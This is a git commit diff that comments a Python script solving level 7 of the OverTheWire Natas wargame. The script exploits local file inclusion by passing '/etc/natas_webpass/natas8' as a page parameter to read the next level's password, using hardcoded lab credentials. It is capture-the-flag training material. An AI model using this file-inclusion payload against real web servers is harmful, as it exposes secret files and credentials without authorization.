025bf379797ec9b1370f775f38d7eebd45d1c026
d4y5kulll88 <148268845+d4y5kulll88@users.noreply.github.com>
2024-01-07 12:36:01 +0530

    Update Natas 7.py

--- Natas 7.py
+++ Natas 7.py
@@ -1,3 +1,5 @@
+# Vulnerability: Local File Inclusion
+
 import requests
 import re
 import html
@@ -5,19 +7,33 @@ from bs4 import BeautifulSoup
 import colorama
 from colorama import Fore, Style
 
+
+# Initialize colorama for colored console output
 colorama.init(autoreset=False)
 print(Fore.LIGHTBLUE_EX, Style.BRIGHT)
 
+
+# Set the username and password for authentication
 username = 'natas7'
 password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
 
+
+# Construct the URL using the given username
 url = f'http://{username}.natas.labs.overthewire.org'
+
+
+# File location which contains the password of the next level
 params = {"page": "/etc/natas_webpass/natas8"}
 
+
+# Make a GET request to the URL with basic authentication using the provided credentials
 resp = requests.get(url=url, auth=(username, password), params=params)
 
+
+# Parse the HTML content of the response using BeautifulSoup
 soup = BeautifulSoup(html.unescape(resp.text), 'lxml')
 
-print("Natas8: ", end="")
-print(re.findall('\n(.*)\n\n\n\n', soup.body.text)[0])
 
+# Extract password for the next level using Regular Expressions
+print("Natas 8: ", end="")
+print(re.findall('\n(.*)\n\n\n\n', soup.body.text)[0])
